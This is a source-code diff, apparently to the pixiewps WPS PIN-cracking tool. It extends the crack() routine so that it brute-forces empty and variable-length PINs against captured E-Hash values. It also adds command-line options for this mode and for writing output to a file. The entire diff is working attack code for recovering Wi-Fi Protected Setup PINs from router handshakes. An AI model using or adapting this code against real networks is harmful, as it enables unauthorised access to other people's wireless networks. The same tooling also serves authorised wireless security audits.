@@ -39,9 +39,9 @@
 uint32_t ecos_rand_simplest(uint32_t *seed);
 uint32_t ecos_rand_simple(uint32_t *seed);
 uint32_t ecos_rand_knuth(uint32_t *seed);
-uint_fast8_t crack(struct global *g, unsigned int *pin);
+uint_fast8_t crack(struct global *g, char *pin);
 
-static const char *option_string = "e:r:s:z:a:n:m:b:Sfv:Vh?";
+static const char *option_string = "e:r:s:z:a:n:m:b:Sflo:v:Vh?";
 static const struct option long_options[] = {
 	{ "pke",       required_argument, 0, 'e' },
 	{ "pkr",       required_argument, 0, 'r' },
@@ -53,6 +53,8 @@ static const struct option long_options[] = {
 	{ "e-bssid",   required_argument, 0, 'b' },
 	{ "dh-small",  no_argument,       0, 'S' },
 	{ "force",     no_argument,       0, 'f' },
+	{ "length",    no_argument,       0, 'l' },
+	{ "output",    required_argument, 0, 'o' },
 	{ "verbosity", required_argument, 0, 'v' },
 	{ "version",   no_argument,       0, 'V' },
 	{ "help",      no_argument,       0,  0  },
@@ -166,6 +168,16 @@ memory_err:
 				break;
 			case 'f':
 				wps->bruteforce = 1;
+				break;
+			case 'l':
+				wps->anylength = 1;
+				break;
+			case 'o':
+				if (!freopen(optarg, "w", stdout))
+				{
+					snprintf(wps->error, 256, "\n [!] Failed to open file for writing -- %s\n\n", optarg);
+					goto usage_err;
+				}
 				break;
 			case 'v':
 				if (get_int(optarg, &wps->verbosity) != 0 || wps->verbosity < 1 || wps->verbosity > 3) {
@@ -462,7 +474,7 @@ usage_err:
 
 	uint_fast8_t k = 0;
 	uint_fast8_t found_p_mode = NONE;
-	unsigned int pin;
+	char pin[WPS_PIN_LEN + 1];
 	uint32_t seed;
 	uint32_t print_seed = 0;
 
@@ -478,7 +490,7 @@ usage_err:
 			DEBUG_PRINT("Trying with E-S2: ");
 			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
 
-			uint_fast8_t r = crack(wps, &pin);
+			uint_fast8_t r = crack(wps, pin);
 			if (r == PIN_FOUND) {
 				found_p_mode = RT;
 				DEBUG_PRINT("Pin found");
@@ -521,7 +533,7 @@ usage_err:
 				DEBUG_PRINT("Trying with E-S2: ");
 				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
 
-				uint_fast8_t r = crack(wps, &pin);
+				uint_fast8_t r = crack(wps, pin);
 				if (r == PIN_FOUND) {
 					found_p_mode = ECOS_SIMPLE;
 					DEBUG_PRINT("Pin found");
@@ -544,7 +556,7 @@ usage_err:
 			DEBUG_PRINT("Trying with E-S2: ");
 			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
 
-			uint_fast8_t r = crack(wps, &pin);
+			uint_fast8_t r = crack(wps, pin);
 			if (r == PIN_FOUND) {
 				found_p_mode = RTL819x;
 				DEBUG_PRINT("Pin found");
@@ -642,7 +654,7 @@ usage_err:
 								DEBUG_PRINT("Trying with E-S2: ");
 								DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
 
-								uint_fast8_t r = crack(wps, &pin);
+								uint_fast8_t r = crack(wps, pin);
 								if (r == PIN_FOUND) {
 									found_p_mode = RTL819x;
 									DEBUG_PRINT("Pin found");
@@ -660,7 +672,7 @@ usage_err:
 									DEBUG_PRINT("Trying with E-S2: ");
 									DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
 
-									uint_fast8_t r2 = crack(wps, &pin);
+									uint_fast8_t r2 = crack(wps, pin);
 									if (r2 == PIN_FOUND) {
 										found_p_mode = RTL819x;
 										DEBUG_PRINT("Pin found");
@@ -723,7 +735,7 @@ usage_err:
 				DEBUG_PRINT("Trying with E-S2: ");
 				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
 
-				uint_fast8_t r = crack(wps, &pin);
+				uint_fast8_t r = crack(wps, pin);
 				if (r == PIN_FOUND) {
 					found_p_mode = ECOS_SIMPLEST;
 					DEBUG_PRINT("Pin found");
@@ -767,7 +779,7 @@ usage_err:
 				DEBUG_PRINT("Trying with E-S2: ");
 				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
 
-				uint_fast8_t r = crack(wps, &pin);
+				uint_fast8_t r = crack(wps, pin);
 				if (r == PIN_FOUND) {
 					found_p_mode = ECOS_KNUTH;
 					DEBUG_PRINT("Pin found");
@@ -830,7 +842,11 @@ usage_err:
 			printf("\n [*] E-S1:       "); byte_array_print(wps->e_s1, WPS_SECRET_NONCE_LEN);
 			printf("\n [*] E-S2:       "); byte_array_print(wps->e_s2, WPS_SECRET_NONCE_LEN);
 		}
-		printf("\n [+] WPS pin:    %08u", pin);
+		if (pin[0] == '\0') {
+			printf("\n [+] WPS pin:    <empty>");
+		} else {
+			printf("\n [+] WPS pin:    %s", pin);
+		}
 	} else {
 		printf("\n [-] WPS pin not found!");
 	}
@@ -903,12 +919,23 @@ uint32_t ecos_rand_knuth(uint32_t *seed) {
 	return *seed;
 }
 
+/* Simple power function */
+int int_pow(int a, int exp) {
+	if (exp <= 0) return 1;
+	int r = a;
+
+	while (--exp) r *= a;
+	return r;
+}
+
 /* PIN cracking attempt */
-uint_fast8_t crack(struct global *g, unsigned int *pin) {
+uint_fast8_t crack(struct global *g, char *pin) {
 	struct global *wps = g;
+	unsigned int i, j, count;
 	unsigned int first_half = 0;
 	unsigned int second_half = 0;
 	uint8_t s_pin[4];
+	char mask[5];
 	uint_fast8_t found = 0;
 
 	uint8_t *buffer = malloc(WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2);
@@ -919,6 +946,107 @@ uint_fast8_t crack(struct global *g, unsigned int *pin) {
 	if (!result)
 		return MEM_ERROR;
 
+	if (wps->anylength) {
+		/* Brute-force entire pin space */
+		for (i = 0; i < 5; i++)
+		{
+			first_half = 0;
+			count = int_pow(10, i);
+
+			while (first_half < count) {
+				uint_to_char_array(first_half, i, s_pin);
+				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, i, wps->psk1);
+				memcpy(buffer, wps->e_s1, WPS_SECRET_NONCE_LEN);
+				memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk1, WPS_PSK_LEN);
+				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
+				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
+				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
+					WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+
+				if (memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
+					first_half++;
+				} else {
+					if (i == 0)
+					{
+						pin[0] = '\0';
+					} else {
+						snprintf((char *)&mask, 5, "%%0%uu", i);
+						snprintf(pin, WPS_PIN_LEN / 2 + 1, mask, first_half);
+					}
+					break;
+				}
+			}
+
+			if (first_half < count) {
+				for (j = 0; j < 5; j++)
+				{
+					second_half = 0;
+					count = int_pow(10, j);
+
+					while (second_half < count) {
+						uint_to_char_array(second_half, j, s_pin);
+						hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, j, wps->psk2);
+						memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
+						memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
+						memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
+						memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
+						hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
+							WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+
+						if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
+							second_half++;
+						} else {
+							if (j > 0)
+							{
+								snprintf((char *)&mask, 5, "%%0%uu", j);
+								snprintf(pin + WPS_PIN_LEN / 2, WPS_PIN_LEN / 2 + 1, mask, second_half);
+							}
+							/* Second half found */
+							found = 1;
+							break;
+						}
+					}
+				}
+				/* First half found, but not second */
+				break;
+			}
+		}
+		free(buffer);
+		free(result);
+
+		return !found;
+	}
+
+	/* Check for empty pin (length = 0) */
+	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, NULL, 0, wps->psk1);
+	memcpy(buffer, wps->e_s1, WPS_SECRET_NONCE_LEN);
+	memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk1, WPS_PSK_LEN);
+	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
+	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
+	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
+		WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+
+	if (!memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
+		/* Second half must be empty too */
+		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, NULL, 0, wps->psk2);
+		memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
+		memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
+		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
+		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
+		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
+			WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+
+		if (!memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
+			/* Empty pin detected */
+			free(buffer);
+			free(result);
+
+			pin[0] = '\0';
+			return 0;
+		}
+	}
+
+	/* Brute-force numeric pins */
 	while (first_half < 10000) {
 		uint_to_char_array(first_half, 4, s_pin);
 		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, 4, wps->psk1);
@@ -996,6 +1124,6 @@ uint_fast8_t crack(struct global *g, unsigned int *pin) {
 	free(buffer);
 	free(result);
 
-	*pin = first_half * 10000 + second_half;
+	snprintf(pin, WPS_PIN_LEN + 1, "%08u", first_half * 10000 + second_half);
 	return !found; /* 0 success, 1 failure */
 }
